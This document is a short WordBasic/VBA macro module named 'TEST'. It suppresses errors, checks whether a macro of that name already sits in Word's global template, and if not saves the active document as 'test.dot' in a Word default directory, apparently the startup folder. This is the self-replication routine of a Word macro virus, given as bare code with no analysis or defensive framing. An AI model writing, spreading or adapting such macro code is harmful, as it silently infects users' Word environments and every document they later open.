   Attribute VB_Name = "TEST"

   Public Sub MAIN()
   Dim fn$
   Dim s$
   Dim cm
   Dim i
   Dim t
   On Error GoTo -1: On Error GoTo exit_
   fn$ = WordBasic.[FileName$]()
   s$ = WordBasic.[DefaultDir$](8) + "\test.dot"
   cm = WordBasic.CountMacros(0, 0, 1)
   If cm > 0 Then
      For i = 1 To cm
         If WordBasic.[MacroName$](i, 0, 0, 1) = "TEST" Then t = 1
      Next i
   End If
   If t <> 1 Then
     WordBasic.FileSaveAs Name:=s$, Format:=1
   End If

   exit_:
   End Sub
